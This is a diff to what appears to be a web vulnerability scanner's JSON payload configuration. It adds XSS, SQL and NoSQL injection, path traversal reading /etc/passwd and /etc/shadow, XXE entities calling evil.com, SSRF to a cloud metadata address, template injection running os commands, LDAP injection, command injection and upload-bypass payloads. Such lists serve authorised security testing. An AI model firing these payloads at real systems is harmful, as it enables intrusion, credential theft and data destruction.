@@ -12,7 +12,12 @@
       "\"><script>alert('ABD-XSS-Test')</script>",
       "';alert('ABD-XSS-Test');//",
       "<img src=x onerror=alert('ABD-XSS-Test')>",
-      "<svg onload=alert('ABD-XSS-Test')>"
+      "<svg onload=alert('ABD-XSS-Test')>",
+      "javascript:alert('ABD-XSS-Test')",
+      "<iframe src=javascript:alert('ABD-XSS-Test')>",
+      "<body onload=alert('ABD-XSS-Test')>",
+      "<details open ontoggle=alert('ABD-XSS-Test')>",
+      "'><svg/onload=alert('ABD-XSS-Test')>"
     ],
     "sqli": [
       "'",
@@ -20,7 +25,18 @@
       "' UNION SELECT NULL--",
       "'; DROP TABLE users--",
       "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
-      "1 UNION SELECT @@version--"
+      "1 UNION SELECT @@version--",
+      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
+      "'; WAITFOR DELAY '00:00:05'--",
+      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    ],
+    "nosqli": [
+      "true, $where: '1 == 1'",
+      "$ne: null",
+      "$regex: '.*'",
+      "$where: 'sleep(5000)'",
+      "'; return db.version(); var dummy='",
+      "[$regex]=.*"
     ],
     "lfi": [
       "../../../etc/passwd",
@@ -28,14 +44,68 @@
       "../../../../etc/shadow",
       "..\\..\\..\\boot.ini",
       "/etc/passwd",
-      "C:\\windows\\system32\\drivers\\etc\\hosts"
+      "C:\\windows\\system32\\drivers\\etc\\hosts",
+      "....//....//....//etc/passwd",
+      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "php://filter/convert.base64-encode/resource=config.php",
+      "expect://id",
+      "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
+    ],
+    "xxe": [
+      "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://evil.com/xxe'>]><root>&xxe;</root>",
+      "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % ext SYSTEM 'http://evil.com/xxe.dtd'> %ext;]><root></root>"
+    ],
+    "ssrf": [
+      "http://127.0.0.1:22",
+      "http://localhost:3306",
+      "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd",
+      "gopher://127.0.0.1:25/_HELO%20localhost",
+      "dict://127.0.0.1:11211/stats",
+      "http://[::1]:80/",
+      "http://0.0.0.0:22"
+    ],
+    "ssti": [
+      "{{7*7}}",
+      "{{config}}",
+      "{{''.__class__.__mro__[2].__subclasses__()}}",
+      "${7*7}",
+      "<%=7*7%>",
+      "{php}echo 7*7;{/php}",
+      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "${{<%[%'\"}}%\\",
+      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+    ],
+    "ldap": [
+      "*",
+      "*)(&",
+      "*))%00",
+      ")(cn=*",
+      "*)(uid=*",
+      "*)(|(objectClass=*",
+      "admin)(&(password=*",
+      "*)(password=*"
     ],
     "rce": [
       "id",
       "whoami",
       "cat /etc/passwd",
       "dir",
-      "ping -c 1 127.0.0.1"
+      "ping -c 1 127.0.0.1",
+      "; id #",
+      "| whoami",
+      "`id`",
+      "$(whoami)",
+      "&& id",
+      "|| id"
+    ],
+    "file_upload": [
+      "test.php.jpg",
+      "test.php%00.jpg",
+      "test.php;.jpg",
+      "test.php.gif",
+      "../test.php"
     ]
   },
   "reporting": {
